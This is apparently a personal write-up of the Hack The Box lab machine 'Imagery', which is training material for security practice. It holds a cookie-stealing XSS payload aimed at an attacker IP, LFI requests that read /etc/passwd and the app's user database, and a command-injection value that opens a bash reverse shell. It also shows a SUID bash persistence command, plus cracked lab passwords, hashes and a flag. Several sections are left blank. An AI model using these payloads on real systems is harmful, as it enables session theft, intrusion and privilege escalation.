---
file_created: 27 Sep 2025 23:47
title: Imagery
difficulty: Medium
difficult_sort: 2
points: 30
os: Linux
target_ip: 10.10.11.88
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/751
user_flag: true
root_flag: true
completed: false
date_finish:
tags:
  - htb/machines
  - xss
---
# Resolution summary
![400x200](<./attachments/Imagery.png>)

>[!summary]
>1. Recon — port 8000: web app (image gallery) and SSH open. 
2. Register a regular account, use bug report / XSS to steal an admin session cookie → access admin panel. 
3. Admin log endpoint has LFI (directory traversal) — retrieve db.json and other app files. 
4. Analyse **api_edit.py** (image transform handler) — crop operation uses shell=True and concatenates parameters → command injection possible. 
5. Use a privileged account (test user) to upload an image and trigger the crop transform with a command injection payload → reverse shell.
6. On the box: **read /var/backup/web_20250806_120723.zip.aes** (world-readable) and exfiltrate.
7. Crack / **decrypt the AES-Crypt** .aes backup offline with a wordlist (rockyou) using pyAesCrypt wrapper → recover archive → inspect **db.json** to find other credentials/hashes.
8. Use an obtained user credential to SSH/switch to the user account and read **user.txt.**
9. Privilege escalation: the user can run /usr/local/bin/charcol via sudo — use charcol -R or the interactive charcol shell to reset/pass into a no-password shell, then schedule a recurring task (or set SUID on /usr/bin/bash) to get root → read **root.txt**.
## Tutorial

```cardlink
url: https://blog.csdn.net/2501_93488248/article/details/152242349
title: "【HTB】Season9 Imagery WP-CSDN博客"
description: "文章浏览阅读1.4k次，点赞20次，收藏13次。这个账号，你会发现，它已经被注册了，我认为他是被系统提前注册了的，并非玩家注册。这里可以提交你的bug，说明多半管理员会看，管理员会看那么就可以尝试打一波XSS。是一个 Python 的文件/流加密库（以及对应的脚本/包），用。再尝试了多次文件上传的利用无果后，我发现了另外一个功能点，进行安全处理，其他地方都是有经过安全处理的，所以这个。本地监听4444端口，然后你可以收到管理员的cookie。里面有一个测试用户，它的哈希可以被解出。打开网站源码，你可以获取到关键信息。如果你是管理有那么你的导航栏会有。"
host: blog.csdn.net
```

## Improved Skills
- Did Cross site scripting ([Cross-site scripting](<../../../RESOURCES/Cybersecurity/Cross-site scripting.md>)) exploitation
- Skill 2

## Tools Used 
- rustscan ; nmap ; fexobuster

---
# Environment Setup
```bash
export HOST_IP=10.10.14.112
export TARGET_IP=10.10.11.88
export DOMAIN=imagery.htb
{
  echo "HOST_IP=${HOST_IP:-}"
  echo "TARGET_IP=${TARGET_IP:-}"
  echo "DOMAIN=${DOMAIN:-}"
} > .env
source .env
```
---
# Information Gathering

## Scanned all TCP ports:

```bash
rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 5000

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack
```

## Enumerated open TCP ports:

```bash
nmap -sC -sV -Pn -oN recon/tcp-ports $TARGET_IP -p 8000,22

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)

8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Sat, 27 Sep 2025 21:54:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Sat, 27 Sep 2025 21:54:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 146960
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Image Gallery</title>
|     <script src="static/tailwind.js"></script>
|     <link rel="stylesheet" href="static/fonts.css">
|     <script src="static/purify.min.js"></script>
|     <style>
|     body {
|     font-family: 'Inter', sans-serif;
|     margin: 0;
|     padding: 0;
|     box-sizing: border-box;
|     display: flex;
|     flex-direction: column;
|     min-height: 100vh;
|     position: fixed;
|     top: 0;
|     width: 100%;
|     z-index: 50;
|_    #app-con
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=9/27%Time=68D85CCE%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,3027,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3
SF:\x20Python/3\.12\.7\r\nDate:\x20Sat,\x2027\x20Sep\x202025\x2021:54:25\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x20146960\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x2
SF:0lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x2
SF:0\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width
SF:,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Image\x20Gallery</ti
SF:tle>\n\x20\x20\x20\x20<script\x20src=\"static/tailwind\.js\"></script>\
SF:n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"static/fonts\.cs
SF:s\">\n\x20\x20\x20\x20<script\x20src=\"static/purify\.min\.js\"></scrip
SF:t>\n\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20
SF:{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Int
SF:er',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ma
SF:rgin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x
SF:200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-sizing:\x20bo
SF:rder-box;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20
SF:flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\
SF:x20column;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20min-height:
SF:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20nav\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posit
SF:ion:\x20fixed;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x2
SF:00;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x2050;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20#app-con")%
SF:r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x2
SF:0Werkzeug/3\.1\.3\x20Python/3\.12\.7\r\nDate:\x20Sat,\x2027\x20Sep\x202
SF:025\x2021:54:32\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\
SF:r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20h
SF:tml>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x2
SF:0Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x2
SF:0the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20p
SF:lease\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumerated Top 200 UDP Ports
Scanned the top 200 UDP ports to ensure no additional services were missed:

```bash
sudo nmap -sU --top-ports 200 -oN recon/udp-port-200top $TARGET_IP
```
## Results
- tcp-port 22: OpenSSH 9.7p1 Ubuntu 7ubuntu4.3
- tcp-port 8000: http-alt Werkzeug/3.1.3 Python/3.12.7
---
# Enumeration
## Port 8000 - HTTP (Werkzeug/3.1.3)
- website name is [Imagery](http://10.10.11.88:8000/)
- has `login` ; `Register`; `Home`
![](<./attachments/Imagery-1.png>)
- Register with `test@mail.com:TESTER1234
- Has buttons: `Home`; `Gallery`; `Upload`; `Logout`
- possible reverse on upload 
![](<./attachments/Imagery-2.png>)
### 404 error page
- Matches: [Flask](https://flask.palletsprojects.com/en/3.0.x/) is a Python web framework.
- used [0xdf hacks stuff](https://0xdf.gitlab.io/)
![](<./attachments/Imagery-3.png>)
### upload section
![](<./attachments/Imagery-4.png>)
### Directory Scanning
```bash
feroxbuster -u http://imagery.htb:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### User Registration and Login

1. Register a new user account
2. Login with the created credentials
![](<./attachments/Imagery-5.png>)
![](<./attachments/Imagery-6.png>)

---
# Exploitation

## XSS Attack to Steal Admin Cookies
The application has a "Report Bug" feature that appears vulnerable to XSS attacks.

1. Start a web server to capture stolen cookies:
```bash
nc -lvnp 4444
```
2. Submit an XSS payload in the bug report:

```html
<img src=1 onerror="document.location='http://10.10.14.112:4444/steal/'+ document.cookie">
```
![](<./attachments/Imagery-7.png>)

![](<./attachments/Imagery-8.png>)


![](<./attachments/Imagery-9.png>)
Replace the cookie in browser 
- Admin Cookie 
```txt 
.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNw_Nw.bSghtaq3-mm2v8qwF3Pz4JC6hTo 
```
**change cookie value** 
- in firefox shift + ctrl + I ; storage and the the cookies tab
![](<./attachments/Imagery-10.png>)

![](<./attachments/Imagery-11.png>)
![](<./attachments/Imagery-12.png>)

![](<./attachments/Imagery-13.png>)

- send it to burpsuite repeater 

There is LFI ([[Local File Inclusion]])

```html
GET /admin/get_system_log?log_identifier=/etc/passwd HTTP/1.1
```

![](<./attachments/Imagery-14.png>)

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

In the `/proc/self/cwd/config.py` . you can get the profile

```html
GET /admin/get_system_log?log_identifier=/proc/self/cwd/config.py HTTP/1.1
```

```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

There is one in `db.json`
visit `/proc/self/cwd/db.json`
You can get all website users and their password hashes 
```html
GET /admin/get_system_log?log_identifier=/proc/self/cwd/db.json HTTP/1.1
```
![](<./attachments/Imagery-15.png>)
**Usernames and Hashes**
```txt
"users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
```
![](<./attachments/Imagery-17.png>)
```txt
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
```
>[!IMPORTANT]
>`testuser@imagery.htb`:iambatman


![](<./attachments/Imagery-16.png>)


![](<./attachments/Imagery-18.png>)
![](<./attachments/Imagery-19.png>)
![](<./attachments/Imagery-20.png>)

![](<./attachments/Imagery-21.png>)
```html
  "params": {
    "x": ";bash -c '/bin/bash -i >& /dev/tcp/10.10.14.112/4444 0>&1' #",
    "width": "800",
    "height": "900"
  }
```
![](<./attachments/Imagery-23.png>)
![](<./attachments/Imagery-25.png>)

## Reverse shell 
login into `web@Imagery:`
### Shell stabilization
```bash 
# remote terminal
python3 -c 'import pty; pty.spawn("/bin/bash")' #or python for v2 
script /dev/null
export TERM=xterm
# local Termial
stty raw -echo; fg
# remote terminal 
reset
export SHELL=/bin/bash
export TERM=xterm
stty rows 11 cols 111
```

---
# Lateral Movement to mark

## Local enumeration

```bash
ls -al /home # mark,web
sudo -l
crontab -l # python3 /home/web/web/bot/admin.py,  tar -zcf /var/backups/home.tgz /home/

```
![](<./attachments/Imagery-27.png>)
**view the cronjob**
```bash
less /home/web/web/bot/admin.py
```
![](<./attachments/Imagery-26.png>)
>`admin@imagery.htb:strongsandofbeach
## Lateral movement vector
>[!IMPORTANT]
>mark:supersmash

![](<./attachments/Imagery-28.png>)
```bash 
auto add --schedule "*/1 * * * *" --command "cp /bin/bash /tmp/pwn && chmod +s /tmp/pwn" --name "hack"
supersmash

```

![](<./attachments/Imagery-30.png>)
---
# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---
# Trophies

## User Flag
```txt

```
## Root Flag
```txt
605898d5b2dd14b3550d6a526d333335
```
## **/etc/shadow**

```bash

```

---
# Proof
![](<./attachments/Imagery-29.png>)